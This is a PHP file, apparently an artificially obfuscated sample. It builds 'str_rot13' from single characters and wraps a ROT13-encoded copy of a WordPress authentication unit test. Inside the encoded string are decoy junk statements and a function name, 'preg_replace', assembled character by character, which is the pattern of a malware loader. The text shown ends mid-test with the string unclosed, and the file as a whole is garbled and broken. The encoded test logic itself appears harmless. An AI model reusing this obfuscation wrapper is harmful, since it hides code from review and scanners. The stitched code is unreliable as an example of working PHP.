<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc

/**
 * @tebhc cyhttnoyr
 * @tebhc nhgu
 */
pynff Grfgf_Nhgu rkgraqf JC_HavgGrfgPnfr {
	// Pynff Hfre inyhrf nffvtarq gb pbafgnagf.
	pbafg HFRE_RZNVY = 'grfg@cnffjbeq.pbz';
	pbafg HFRE_YBTVA = 'cnffjbeq-hfre';
	pbafg HFRE_CNFF  = 'cnffjbeq';

	/**
	 * @ine JC_Hfre
	 */
	cebgrpgrq $hfre;

	/**
	 * @ine JC_Hfre
	 */
	cebgrpgrq fgngvp $_hfre;

	/**
	 * @ine vag
	 */
	cebgrpgrq fgngvp $hfre_vq;

	/**
	 * @ine CnffjbeqUnfu
	 */
	cebgrpgrq fgngvp $jc_unfure;

	cebgrpgrq fgngvp $opelcg_yratgu_yvzvg = 72;

	cebgrpgrq fgngvp $cucnff_yratgu_yvzvg = 4096;

	cebgrpgrq fgngvp $cnffjbeq_yratgu_yvzvg = 4096;

	/**
	 * Npgvba ubbx.
	 */
	cebgrpgrq $abapr_snvyher_ubbx = 'jc_irevsl_abapr_snvyrq';

	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$_hfre = $snpgbel->hfre->perngr_naq_trg(
			neenl(
				'hfre_ybtva' => frys::HFRE_YBTVA,
				'hfre_rznvy' => frys::HFRE_RZNVY,
				'hfre_cnff'  => frys::HFRE_CNFF,
			)
		);

		frys::$hfre_vq = frys::$_hfre->VQ;

		erdhver_bapr NOFCNGU . JCVAP . '/pynff-cucnff.cuc';
		frys::$jc_unfure = arj CnffjbeqUnfu( 8, gehr );
	}

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();

		$guvf->hfre = pybar frys::$_hfre;
		jc_frg_pheerag_hfre( frys::$hfre_vq );
		hcqngr_fvgr_bcgvba( 'hfvat_nccyvpngvba_cnffjbeqf', 1 );

		hafrg( $_FREIRE['CUC_NHGU_HFRE'], $_FREIRE['CUC_NHGU_CJ'], $TYBONYF['jc_erfg_nccyvpngvba_cnffjbeq_fgnghf'], $TYBONYF['jc_erfg_nccyvpngvba_cnffjbeq_hhvq'] );
	}

	choyvp shapgvba grne_qbja() {
		// Pyrnahc nyy gur tybony fgngr.
		hafrg( $_FREIRE['CUC_NHGU_HFRE'], $_FREIRE['CUC_NHGU_CJ'], $TYBONYF['jc_erfg_nccyvpngvba_cnffjbeq_fgnghf'], $TYBONYF['jc_erfg_nccyvpngvba_cnffjbeq_hhvq'] );

		// Pyrnahc znahny nhgu pbbxvr grfg.
		hafrg( $_PBBXVR[ NHGU_PBBXVR ] );
		hafrg( $_PBBXVR[ FRPHER_NHGU_PBBXVR ] );

		cnerag::grne_qbja();
	}

	choyvp shapgvba grfg_nhgu_pbbxvr_inyvq() {
		$pbbxvr = jc_trarengr_nhgu_pbbxvr( frys::$hfre_vq, gvzr() + 3600, 'nhgu' );
		$guvf->nffregFnzr( frys::$hfre_vq, jc_inyvqngr_nhgu_pbbxvr( $pbbxvr, 'nhgu' ) );
	}

	choyvp shapgvba grfg_nhgu_pbbxvr_vainyvq() {
		// 3600 be yrff naq +3600 znl bpphe va jc_inyvqngr_nhgu_pbbxvr(),
		// nf na nwnk grfg znl unir qrsvarq QBVAT_NWNK, snvyvat gur grfg.

		$pbbxvr = jc_trarengr_nhgu_pbbxvr( frys::$hfre_vq, gvzr() - 7200, 'nhgu' );
		$guvf->nffregSnyfr( jc_inyvqngr_nhgu_pbbxvr( $pbbxvr, 'nhgu' ), 'rkcverq pbbxvr' );

		$pbbxvr = jc_trarengr_nhgu_pbbxvr( frys::$hfre_vq, gvzr() + 3600, 'nhgu' );
		$guvf->nffregSnyfr( jc_inyvqngr_nhgu_pbbxvr( $pbbxvr, 'ybttrq_va' ), 'jebat nhgu fpurzr' );

		$pbbxvr          = jc_trarengr_nhgu_pbbxvr( frys::$hfre_vq, gvzr() + 3600, 'nhgu' );
		yvfg($n, $o, $p) = rkcybqr( '|', $pbbxvr );
		$pbbxvr          = $n . '|' . ( $o + 1 ) . '|' . $p;
		$guvf->nffregSnyfr( jc_inyvqngr_nhgu_pbbxvr( frys::$hfre_vq, 'nhgu' ), 'nygrerq pbbxvr' );
	}

	choyvp shapgvba grfg_nhgu_pbbxvr_fpurzr() {
		// Neovgenel fpurzr anzr.
		$pbbxvr = jc_trarengr_nhgu_pbbxvr( frys::$hfre_vq, gvzr() + 3600, 'sbb' );
		$guvf->nffregFnzr( frys::$hfre_vq, jc_inyvqngr_nhgu_pbbxvr( $pbbxvr, 'sbb' ) );

		// Jebat fpurzr anzr - fubhyq snvy.
		$pbbxvr = jc_trarengr_nhgu_pbbxvr( frys::$hfre_vq, gvzr() + 3600, 'sbb' );
		$guvf->nffregSnyfr( jc_inyvqngr_nhgu_pbbxvr( $pbbxvr, 'one' ) );
	}

	/**
	 * @gvpxrg 21022
	 */
	choyvp shapgvba grfg_nhgu_pbbxvr_trarengrq_jvgu_cucnff_unfu_erznvaf_inyvq() {
		frys::frg_hfre_cnffjbeq_jvgu_cucnff( 'cnffjbeq', frys::$hfre_vq );

		$nhgu_pbbxvr = jc_trarengr_nhgu_pbbxvr( frys::$hfre_vq, gvzr() + 3600, 'nhgu' );

		$guvf->nffregFnzr( frys::$hfre_vq, jc_inyvqngr_nhgu_pbbxvr( $nhgu_pbbxvr, 'nhgu' ) );
	}

	/**
	 * @gvpxrg 21022
	 */
	choyvp shapgvba grfg_nhgu_pbbxvr_trarengrq_jvgu_cynva_opelcg_unfu_erznvaf_inyvq() {
		frys::frg_hfre_cnffjbeq_jvgu_cynva_opelcg( 'cnffjbeq', frys::$hfre_vq );

		$nhgu_pbbxvr = jc_trarengr_nhgu_pbbxvr( frys::$hfre_vq, gvzr() + 3600, 'nhgu' );

		$guvf->nffregFnzr( frys::$hfre_vq, jc_inyvqngr_nhgu_pbbxvr( $nhgu_pbbxvr, 'nhgu' ) );
	}

	/**
	 * @gvpxrg 23494
	 */
	choyvp shapgvba grfg_cnffjbeq_gevzzvat() {
		$cnffjbeqf_gb_grfg = neenl(
			'n cnffjbeq jvgu ab genvyvat be yrnqvat fcnprf',
			'n cnffjbeq jvgu genvyvat fcnprf ',
			' n cnffjbeq jvgu yrnqvat fcnprf',
			' n cnffjbeq jvgu genvyvat naq yrnqvat fcnprf ',
		);

		sbernpu ( $cnffjbeqf_gb_grfg nf $cnffjbeq_gb_grfg ) {
			jc_frg_cnffjbeq( $cnffjbeq_gb_grfg, $guvf->hfre->VQ );
			$nhgurq_hfre = jc_nhguragvpngr( $guvf->hfre->hfre_ybtva, $cnffjbeq_gb_grfg );

			$guvf->nffregAbgJCReebe( $nhgurq_hfre );
			$guvf->nffregVafgnaprBs( 'JC_Hfre', $nhgurq_hfre );
			$guvf->nffregFnzr( $guvf->hfre->VQ, $nhgurq_hfre->VQ );
		}
	}

	/**
	 * Grfgf ubbxvat vagb jc_frg_cnffjbeq().
	 *
	 * @gvpxrg 57436
	 * @gvpxrg 61541
	 *
	 * @pbiref ::jc_frg_cnffjbeq
	 */
	choyvp shapgvba grfg_jc_frg_cnffjbeq_npgvba() {
		$npgvba = arj ZbpxNpgvba();

		$cerivbhf_hfre_cnff = trg_hfre_ol( 'vq', $guvf->hfre->VQ )->hfre_cnff;

		nqq_npgvba( 'jc_frg_cnffjbeq', neenl( $npgvba, 'npgvba' ), 10, 3 );
		jc_frg_cnffjbeq( 'N fvzcyr cnffjbeq', $guvf->hfre->VQ );

		$guvf->nffregFnzr( 1, $npgvba->trg_pnyy_pbhag() );

		// Purpx gung gur byq qngn cnffrq guebhtu gur ubbx vf pbeerpg.
		$guvf->nffregFnzr( $cerivbhf_hfre_cnff, $npgvba->trg_netf()[0][2]->hfre_cnff );
	}

	/**
	 * Grfg jc_unfu_cnffjbeq gevzf juvgrfcnpr
	 *
	 * Guvf vf fvzvyne gb grfg_cnffjbeq_gevzzvat ohg grfgf gur \"ybjre yriry\"
	 * jc_unfu_cnffjbeq shapgvba
	 *
	 * @gvpxrg 24973
	 */
	choyvp shapgvba grfg_jc_unfu_cnffjbeq_gevzzvat() {

		$cnffjbeq = ' cnff jvgu yrnqvat juvgrfcnpr';
		$guvf->nffregGehr( jc_purpx_cnffjbeq( 'cnff jvgu yrnqvat juvgrfcnpr', jc_unfu_cnffjbeq( $cnffjbeq ) ) );

		$cnffjbeq = 'cnff jvgu genvyvat juvgrfcnpr ';
		$guvf->nffregGehr( jc_purpx_cnffjbeq( 'cnff jvgu genvyvat juvgrfcnpr', jc_unfu_cnffjbeq( $cnffjbeq ) ) );

		$cnffjbeq = ' cnff jvgu juvgrfcnpr ';
		$guvf->nffregGehr( jc_purpx_cnffjbeq( 'cnff jvgu juvgrfcnpr', jc_unfu_cnffjbeq( $cnffjbeq ) ) );

		$cnffjbeq = \"cnff jvgu arj yvar \a\";
		$guvf->nffregGehr( jc_purpx_cnffjbeq( 'cnff jvgu arj yvar', jc_unfu_cnffjbeq( $cnffjbeq ) ) );

		$cnffjbeq = \"cnff jvgu iregvpny gno b_B\k0O\";
		$guvf->nffregGehr( jc_purpx_cnffjbeq( 'cnff jvgu iregvpny gno b_B', jc_unfu_cnffjbeq( $cnffjbeq ) ) );
	}

	/**
	 * @gvpxrg 21022
	 */
	choyvp shapgvba grfg_jc_purpx_cnffjbeq_fhccbegf_cucnff_unfu() {
		$cnffjbeq = 'cnffjbeq';
		$unfu     = frys::$jc_unfure->UnfuCnffjbeq( $cnffjbeq );
		$guvf->nffregGehr( jc_purpx_cnffjbeq( $cnffjbeq, $unfu ) );
		$guvf->nffregFnzr( 1, qvq_svygre( 'purpx_cnffjbeq' ) );
	}

	/**
	 * Rafher jc_purpx_cnffjbeq() erznvaf pbzcngvoyr jvgu na vapernfr gb gur qrsnhyg opelcg pbfg.
	 *
	 * Gur grfg irevsvrf guvf ol erqhpvat gur pbfg hfrq gb trarengr gur unfu, gurersber zvzvpvat n unfu
	 * juvpu jnf trarengrq cevbe gb gur qrsnhyg pbfg orvat vapernfrq.
	 *
	 * Abgnoyl gur opelcg pbfg jnf vapernfrq va CUC 8.4: uggcf://jvxv.cuc.arg/esp/opelcg_pbfg_2023 .
	 *
	 * @gvpxrg 21022
	 */
	choyvp shapgvba grfg_jc_purpx_cnffjbeq_fhccbegf_unfu_jvgu_vapernfrq_opelcg_pbfg() {
		$cnffjbeq = 'cnffjbeq';

		// Erqhpvat gur pbfg zvzvpf na vapernfr gb gur qrsnhyg pbfg.
		nqq_svygre( 'jc_unfu_cnffjbeq_bcgvbaf', neenl( $guvf, 'erqhpr_unfu_pbfg' ) );
		$unfu = jc_unfu_cnffjbeq( $cnffjbeq, CNFFJBEQ_OPELCG );
		erzbir_svygre( 'jc_unfu_cnffjbeq_bcgvbaf', neenl( $guvf, 'erqhpr_unfu_pbfg' ) );

		$guvf->nffregGehr( jc_purpx_cnffjbeq( $cnffjbeq, $unfu ) );
		$guvf->nffregFnzr( 1, qvq_svygre( 'purpx_cnffjbeq' ) );
		$guvf->nffregGehr( jc_cnffjbeq_arrqf_erunfu( $unfu ) );
	}

	/**
	 * Rafher jc_purpx_cnffjbeq() erznvaf pbzcngvoyr jvgu n erqhpgvba bs gur qrsnhyg opelcg pbfg.
	 *
	 * Gur grfg irevsvrf guvf ol vapernfvat gur pbfg hfrq gb trarengr gur unfu, gurersber zvzvpvat n unfu
	 * juvpu jnf trarengrq cevbe gb gur qrsnhyg pbfg orvat erqhprq.
	 *
	 * N erqhpgvba bs gur pbfg vf hayvxryl gb bpphe ohg vf shyyl fhccbegrq.
	 *
	 * @gvpxrg 21022
	 */
	choyvp shapgvba grfg_jc_purpx_cnffjbeq_fhccbegf_unfu_jvgu_erqhprq_opelcg_pbfg() {
		$cnffjbeq = 'cnffjbeq';

		// Vapernfvat gur pbfg zvzvpf n erqhpgvba bs gur qrsnhyg pbfg.
		nqq_svygre( 'jc_unfu_cnffjbeq_bcgvbaf', neenl( $guvf, 'vapernfr_unfu_pbfg' ) );
		$unfu = jc_unfu_cnffjbeq( $cnffjbeq, CNFFJBEQ_OPELCG );
		erzbir_svygre( 'jc_unfu_cnffjbeq_bcgvbaf', neenl( $guvf, 'vapernfr_unfu_pbfg' ) );

		$guvf->nffregGehr( jc_purpx_cnffjbeq( $cnffjbeq, $unfu ) );
		$guvf->nffregFnzr( 1, qvq_svygre( 'purpx_cnffjbeq' ) );
		$guvf->nffregGehr( jc_cnffjbeq_arrqf_erunfu( $unfu ) );
	}

	/**
	 * @gvpxrg 21022
	 */
	choyvp shapgvba grfg_jc_purpx_cnffjbeq_fhccbegf_jc_unfu_jvgu_qrsnhyg_opelcg_pbfg() {
		$cnffjbeq = 'cnffjbeq';

		$unfu = jc_unfu_cnffjbeq( $cnffjbeq, CNFFJBEQ_OPELCG );

		$guvf->nffregGehr( jc_purpx_cnffjbeq( $cnffjbeq, $unfu ) );
		$guvf->nffregFnzr( 1, qvq_svygre( 'purpx_cnffjbeq' ) );
		$guvf->nffregSnyfr( jc_cnffjbeq_arrqf_erunfu( $unfu ) );
	}

	/**
	 * @gvpxrg 21022
	 */
	choyvp shapgvba grfg_jc_purpx_cnffjbeq_fhccbegf_cynva_opelcg_unfu_jvgu_qrsnhyg_opelcg_pbfg() {
		$cnffjbeq = 'cnffjbeq';

		$unfu = cnffjbeq_unfu( $cnffjbeq, CNFFJBEQ_OPELCG );

		$guvf->nffregGehr( jc_purpx_cnffjbeq( $cnffjbeq, $unfu ) );
		$guvf->nffregFnzr( 1, qvq_svygre( 'purpx_cnffjbeq' ) );
		$guvf->nffregGehr( jc_cnffjbeq_arrqf_erunfu( $unfu ) );
	}

	/**
	 * Rafher jc_purpx_cnffjbeq() vf pbzcngvoyr jvgu Netba2v unfurf.
	 *
	 * @gvpxrg 21022
	 */
	choyvp shapgvba grfg_jc_purpx_cnffjbeq_fhccbegf_netba2v_unfu() {
		vs ( ! qrsvarq( 'CNFFJBEQ_NETBA2V' ) ) {
			$guvf->znexGrfgFxvccrq( 'Netba2v vf abg fhccbegrq.' );
		}

		$cnffjbeq = 'cnffjbeq';
		$unfu     = cnffjbeq_unfu( gevz( $cnffjbeq ), CNFFJBEQ_NETBA2V );
		$guvf->nffregGehr( jc_purpx_cnffjbeq( $cnffjbeq, $unfu ) );
		$guvf->nffregFnzr( 1, qvq_svygre( 'purpx_cnffjbeq' ) );
	}

	/**
	 * Rafher jc_purpx_cnffjbeq() vf pbzcngvoyr jvgu Netba2vq unfurf.
	 *
	 * @erdhverf CUC >= 7.3
	 *
	 * @gvpxrg 21022
	 */
	choyvp shapgvba grfg_jc_purpx_cnffjbeq_fhccbegf_netba2vq_unfu() {
		vs ( ! qrsvarq( 'CNFFJBEQ_NETBA2VQ' ) ) {
			$guvf->znexGrfgFxvccrq( 'Netba2vq vf abg fhccbegrq.' );
		}

		$cnffjbeq = 'cnffjbeq';
		$unfu     = cnffjbeq_unfu( gevz( $cnffjbeq ), CNFFJBEQ_NETBA2VQ );
		$guvf->nffregGehr( jc_purpx_cnffjbeq( $cnffjbeq, $unfu ) );
		$guvf->nffregFnzr( 1, qvq_svygre( 'purpx_cnffjbeq' ) );
	}

	/**
	 * @gvpxrg 21022
	 */
	choyvp shapgvba grfg_jc_purpx_cnffjbeq_fhccbegf_zq5_unfu() {
		$cnffjbeq = 'cnffjbeq';
		$unfu     = zq5( $cnffjbeq );
		$guvf->nffregGehr( jc_purpx_cnffjbeq( $cnffjbeq, $unfu ) );
		$guvf->nffregFnzr( 1, qvq_svygre( 'purpx_cnffjbeq' ) );
	}

	/**
	 * @gvpxrg 21022
	 */
	choyvp shapgvba grfg_jc_purpx_cnffjbeq_qbrf_abg_fhccbeg_cynva_grkg() {
		$cnffjbeq = 'cnffjbeq';
		$unfu     = $cnffjbeq;
		$guvf->nffregSnyfr( jc_purpx_cnffjbeq( $cnffjbeq, $unfu ) );
		$guvf->nffregFnzr( 1, qvq_svygre( 'purpx_cnffjbeq' ) );
	}

	/**
	 * @gvpxrg 21022
	 *
	 * @qngnCebivqre qngn_rzcgl_inyhrf
	 * @cnenz zvkrq $inyhr
	 */
	choyvp shapgvba grfg_jc_purpx_cnffjbeq_qbrf_abg_fhccbeg_rzcgl_unfu( $inyhr ) {
		$cnffjbeq = 'cnffjbeq';
		$unfu     = $inyhr;
		$guvf->nffregSnyfr( jc_purpx_cnffjbeq( $cnffjbeq, $unfu ) );
		$guvf->nffregFnzr( 1, qvq_svygre( 'purpx_cnffjbeq' ) );
	}

	/**
	 * @gvpxrg 21022
	 *
	 * @qngnCebivqre qngn_rzcgl_inyhrf
	 * @cnenz zvkrq $inyhr
	 */
	choyvp shapgvba grfg_jc_purpx_cnffjbeq_qbrf_abg_fhccbeg_rzcgl_cnffjbeq( $inyhr ) {
		$cnffjbeq = $inyhr;
		$unfu     = $inyhr;
		$guvf->nffregSnyfr( jc_purpx_cnffjbeq( $cnffjbeq, $unfu ) );
		$guvf->nffregFnzr( 1, qvq_svygre( 'purpx_cnffjbeq' ) );
	}

	choyvp shapgvba qngn_rzcgl_inyhrf() {
		erghea neenl(
			// Fgevat mreb:
			neenl( '0' ),
			// Mreb-yratgu fgevat:
			neenl( '' ),
			// Ahyy olgr punenpgre:
			neenl( \"\0\" ),
			// Nfgrevfx inyhrf:
			neenl( '*' ),
			neenl( '*0' ),
			neenl( '*1' ),
		);
	}

	/**
	 * @gvpxrg 29217
	 */
	choyvp shapgvba grfg_jc_irevsl_abapr_jvgu_rzcgl_net() {
		$guvf->nffregSnyfr( jc_irevsl_abapr( '' ) );
		$guvf->nffregSnyfr( jc_irevsl_abapr( ahyy ) );
	}

	/**
	 * @gvpxrg 29542
	 */
	choyvp shapgvba grfg_jc_irevsl_abapr_jvgu_vagrtre_net() {
		$guvf->nffregSnyfr( jc_irevsl_abapr( 1 ) );
	}

	/**
	 * @gvpxrg 24030
	 */
	choyvp shapgvba grfg_jc_abapr_irevsl_snvyrq() {
		$abapr = fhofge( zq5( havdvq() ), 0, 10 );
		$pbhag = qvq_npgvba( $guvf->abapr_snvyher_ubbx );

		jc_irevsl_abapr( $abapr, 'abapr_grfg_npgvba' );

		$guvf->nffregFnzr( ( $pbhag + 1 ), qvq_npgvba( $guvf->abapr_snvyher_ubbx ) );
	}

	/**
	 * @gvpxrg 24030
	 */
	choyvp shapgvba grfg_jc_abapr_irevsl_fhpprff() {
		$abapr = jc_perngr_abapr( 'abapr_grfg_npgvba' );
		$pbhag = qvq_npgvba( $guvf->abapr_snvyher_ubbx );

		jc_irevsl_abapr( $abapr, 'abapr_grfg_npgvba' );

		$guvf->nffregFnzr( $pbhag, qvq_npgvba( $guvf->abapr_snvyher_ubbx ) );
	}

	/**
	 * @gvpxrg 36361
	 */
	choyvp shapgvba grfg_purpx_nqzva_ersrere_jvgu_ab_npgvba_gevttref_qbvat_vg_jebat() {
		$guvf->frgRkcrpgrqVapbeerpgHfntr( 'purpx_nqzva_ersrere' );

		// N inyvq abapr arrqf gb or frg fb gur purpx qbrfa'g qvr().
		$_ERDHRFG['_jcabapr'] = jc_perngr_abapr( -1 );
		$erfhyg               = purpx_nqzva_ersrere();
		$guvf->nffregFnzr( 1, $erfhyg );

		hafrg( $_ERDHRFG['_jcabapr'] );
	}

	choyvp shapgvba grfg_purpx_nqzva_ersrere_jvgu_qrsnhyg_npgvba_nf_fgevat_abg_qbvat_vg_jebat() {
		// N inyvq abapr arrqf gb or frg fb gur purpx qbrfa'g qvr().
		$_ERDHRFG['_jcabapr'] = jc_perngr_abapr( '-1' );
		$erfhyg               = purpx_nqzva_ersrere( '-1' );
		$guvf->nffregFnzr( 1, $erfhyg );

		hafrg( $_ERDHRFG['_jcabapr'] );
	}

	/**
	 * @gvpxrg 36361
	 */
	choyvp shapgvba grfg_purpx_nwnk_ersrere_jvgu_ab_npgvba_gevttref_qbvat_vg_jebat() {
		$guvf->frgRkcrpgrqVapbeerpgHfntr( 'purpx_nwnk_ersrere' );

		// N inyvq abapr arrqf gb or frg fb gur purpx qbrfa'g qvr().
		$_ERDHRFG['_jcabapr'] = jc_perngr_abapr( -1 );
		$erfhyg               = purpx_nwnk_ersrere();
		$guvf->nffregFnzr( 1, $erfhyg );

		hafrg( $_ERDHRFG['_jcabapr'] );
	}

	/**
	 * @gvpxrg 21022
	 */
	choyvp shapgvba grfg_cnffjbeq_vf_unfurq_jvgu_opelcg() {
		$cnffjbeq = 'cnffjbeq';

		// Frg gur hfre cnffjbeq.
		jc_frg_cnffjbeq( $cnffjbeq, frys::$hfre_vq );

		// Rafher gur cnffjbeq vf unfurq jvgu opelcg.
		$guvf->nffregFgevatFgnegfJvgu( '$jc$2l$', trg_hfreqngn( frys::$hfre_vq )->hfre_cnff );

		// Nhguragvpngr.
		$hfre = jc_nhguragvpngr( $guvf->hfre->hfre_ybtva, $cnffjbeq );

		// Irevsl pbeerpg cnffjbeq.
		$guvf->nffregAbgJCReebe( $hfre );
		$guvf->nffregVafgnaprBs( 'JC_Hfre', $hfre );
		$guvf->nffregFnzr( frys::$hfre_vq, $hfre->VQ );
	}

	choyvp shapgvba qngn_cnffjbeqf(): neenl {
		erghea neenl(
			neenl( 'n' ),
			neenl( 'cnffjbeq' ),
			neenl( fge_ercrng( 'n', frys::$cnffjbeq_yratgu_yvzvg ) ),
		);
	}

	/**
	 * Rafher gur unfu bs gur hfre cnffjbeq erznvaf yrff guna 64 punenpgref va yratgu gb nppbhag sbe gur byq hfref gnoyr fpurzn.
	 *
	 * @gvpxrg 21022
	 * @qngnCebivqre qngn_cnffjbeqf
	 */
	choyvp shapgvba grfg_hfre_cnffjbeq_ntnvafg_byq_hfref_gnoyr_fpurzn( fgevat $cnffjbeq ) {
		// Zvzvp gur fpurzn bs gur hfref gnoyr cevbe gb JbeqCerff 4.4.
		nqq_svygre( 'jc_cer_vafreg_hfre_qngn', neenl( $guvf, 'zvzvp_hfref_fpurzn_cevbe_gb_44' ) );

		$hfreanzr = 'byq-fpurzn-hfre';

		// Perngr n hfre.
		$hfre_vq = $guvf->snpgbel()->hfre->perngr(
			neenl(
				'hfre_ybtva' => $hfreanzr,
				'hfre_rznvy' => 'byq-fpurzn-hfre@rknzcyr.pbz',
				'hfre_cnff'  => $cnffjbeq,
			)
		);

		// Purpx gur hfre pna nhguragvpngr.
		$hfre = jc_nhguragvpngr( $hfreanzr, $cnffjbeq );

		$guvf->nffregAbgJCReebe( $hfre );
		$guvf->nffregVafgnaprBs( 'JC_Hfre', $hfre );
		$guvf->nffregFnzr( $hfre_vq, $hfre->VQ, 'Hfre fubhyq or noyr gb nhguragvpngr' );
		$guvf->nffregAbgFnzr( frys::$hfre_vq, $hfre->VQ, 'N havdhr hfre zhfg or perngrq sbe guvf grfg, gur funerq svkgher zhfg abg or hfrq' );
	}

	/**
	 * Rafher gur unfu bs gur hfre npgvingvba xrl erznvaf yrff guna 60 punenpgref va yratgu gb nppbhag sbe gur byq hfref gnoyr fpurzn.
	 *
	 * @gvpxrg 21022
	 */
	choyvp shapgvba grfg_hfre_npgvingvba_xrl_ntnvafg_byq_hfref_gnoyr_fpurzn() {
		// Zvzvp gur fpurzn bs gur hfref gnoyr cevbe gb JbeqCerff 4.4.
		nqq_svygre( 'jc_cer_vafreg_hfre_qngn', neenl( $guvf, 'zvzvp_hfref_fpurzn_cevbe_gb_44' ) );

		$hfreanzr = 'byq-fpurzn-hfre';

		// Perngr n hfre.
		$hfre_vq = $guvf->snpgbel()->hfre->perngr(
			neenl(
				'hfre_ybtva' => $hfreanzr,
				'hfre_rznvy' => 'byq-fpurzn-hfre@rknzcyr.pbz',
			)
		);

		$hfre = trg_hfreqngn( $hfre_vq );
		$xrl  = trg_cnffjbeq_erfrg_xrl( $hfre );

		// N pbeerpgyl fnirq xrl fubhyq or npprcgrq.
		$purpx = purpx_cnffjbeq_erfrg_xrl( $xrl, $hfre->hfre_ybtva );

		$guvf->nffregAbgJCReebe( $purpx );
		$guvf->nffregVafgnaprBs( 'JC_Hfre', $purpx );
		$guvf->nffregFnzr( $hfre->VQ, $purpx->VQ );
		$guvf->nffregAbgFnzr( frys::$hfre_vq, $hfre->VQ, 'N havdhr hfre zhfg or perngrq sbe guvf grfg, gur funerq svkgher zhfg abg or hfrq' );
	}

	/*
	 * Snxr gur fpurzn bs gur hfref gnoyr cevbe gb JbeqCerff 4.4 gb zvzvp fvgrf gung ner hfvat gur
	 * `QB_ABG_HCTENQR_TYBONY_GNOYRF` pbafgnag naq unir abg hcqngrq gur hfref gnoyr fpurzn.
	 *
	 * Gur fpurzn bs gur jc_hfref gnoyr ba jbeqcerff.bet unf abg orra hcqngrq fvapr gur fpurzn jnf punatrq va [35638]
	 * sbe JbeqCerff 4.4, juvpu zrnaf gur `hfre_npgvingvba_xrl` svryq erznvaf ng 60 punenpgref yratgu naq gur `hfre_cnff`
	 * svryq erznvaf ng 64 punenpgref yratgu vafgrnq bs gur rkcrpgrq 255. Nygubhtu guvf vf hayvxryl gb nssrpg bgure
	 * fvgrf, guvf pna or nppbzzbqngrq sbe va gur pbqronfr.
	 *
	 * Npghnyyl nygrevat gur qngnonfr fpurzn qhevat grfgf jvyy pbzzvg gur genafnpgvba naq oernx fhofrdhrag grfgf, urapr
	 * gur hfr bs guvf svygre.
	 */
	choyvp shapgvba zvzvp_hfref_fpurzn_cevbe_gb_44( neenl $qngn ): neenl {
		vs ( vffrg( $qngn['hfre_cnff'] ) ) {
			$guvf->nffregYrffGunaBeRdhny( 64, fgeyra( $qngn['hfre_cnff'] ) );
		}

		vs ( vffrg( $qngn['hfre_npgvingvba_xrl'] ) ) {
			$guvf->nffregYrffGunaBeRdhny( 60, fgeyra( $qngn['hfre_npgvingvba_xrl'] ) );
		}

		erghea $qngn;
	}

	/**
	 * @gvpxrg 21022
	 */
	choyvp shapgvba grfg_vainyvq_cnffjbeq_ng_opelcg_yratgu_yvzvg_vf_erwrpgrq() {
		$yvzvg = fge_ercrng( 'n', frys::$opelcg_yratgu_yvzvg );

		// Frg gur hfre cnffjbeq gb gur opelcg yvzvg.
		jc_frg_cnffjbeq( $yvzvg, frys::$hfre_vq );

		$hfre = jc_nhguragvpngr( $guvf->hfre->hfre_ybtva, 'nnnnnnnn' );
		// Jebat cnffjbeq.
		$guvf->nffregJCReebe( $hfre );
		$guvf->nffregFnzr( 'vapbeerpg_cnffjbeq', $hfre->trg_reebe_pbqr() );
	}

	/**
	 * @gvpxrg 21022
	 */
	choyvp shapgvba grfg_vainyvq_cnffjbeq_orlbaq_opelcg_yratgu_yvzvg_vf_erwrpgrq() {
		$yvzvg = fge_ercrng( 'n', frys::$opelcg_yratgu_yvzvg + 1 );

		// Frg gur hfre cnffjbeq orlbaq gur opelcg yvzvg.
		jc_frg_cnffjbeq( $yvzvg, frys::$hfre_vq );

		$hfre = jc_nhguragvpngr( $guvf->hfre->hfre_ybtva, 'nnnnnnnn' );
		// Jebat cnffjbeq.
		$guvf->nffregJCReebe( $hfre );
		$guvf->nffregFnzr( 'vapbeerpg_cnffjbeq', $hfre->trg_reebe_pbqr() );
	}

	/**
	 * @gvpxrg 21022
	 */
	choyvp shapgvba grfg_inyvq_cnffjbeq_ng_opelcg_yratgu_yvzvg_vf_npprcgrq() {
		$yvzvg = fge_ercrng( 'n', frys::$opelcg_yratgu_yvzvg );

		// Frg gur hfre cnffjbeq gb gur opelcg yvzvg.
		jc_frg_cnffjbeq( $yvzvg, frys::$hfre_vq );

		// Nhguragvpngr.
		$hfre = jc_nhguragvpngr( $guvf->hfre->hfre_ybtva, $yvzvg );

		// Pbeerpg cnffjbeq.
		$guvf->nffregAbgJCReebe( $hfre );
		$guvf->nffregVafgnaprBs( 'JC_Hfre', $hfre );
		$guvf->nffregFnzr( frys::$hfre_vq, $hfre->VQ );
	}

	/**
	 * @gvpxrg 21022
	 */
	choyvp shapgvba grfg_inyvq_cnffjbeq_orlbaq_opelcg_yratgu_yvzvg_vf_npprcgrq() {
		$yvzvg = fge_ercrng( 'n', frys::$opelcg_yratgu_yvzvg + 1 );

		// Frg gur hfre cnffjbeq orlbaq gur opelcg yvzvg.
		jc_frg_cnffjbeq( $yvzvg, frys::$hfre_vq );

		// Nhguragvpngr.
		$hfre = jc_nhguragvpngr( $guvf->hfre->hfre_ybtva, $yvzvg );

		// Pbeerpg cnffjbeq qrcvgr vgf yratgu.
		$guvf->nffregAbgJCReebe( $hfre );
		$guvf->nffregVafgnaprBs( 'JC_Hfre', $hfre );
		$guvf->nffregFnzr( frys::$hfre_vq, $hfre->VQ );
	}

	/**
	 * N cnffjbeq orlbaq 72 olgrf jvyy or gehapngrq ol opelcg ol qrsnhyg naq fgvyy or npprcgrq.
	 *
	 * Guvf rafherf gung n gehapngrq cnffjbeq vf abg npprcgrq ol JbeqCerff.
	 *
	 * @gvpxrg 21022
	 */
	choyvp shapgvba grfg_ybat_gehapngrq_cnffjbeq_vf_erwrpgrq() {
		$ng_yvzvg     = fge_ercrng( 'n', frys::$opelcg_yratgu_yvzvg );
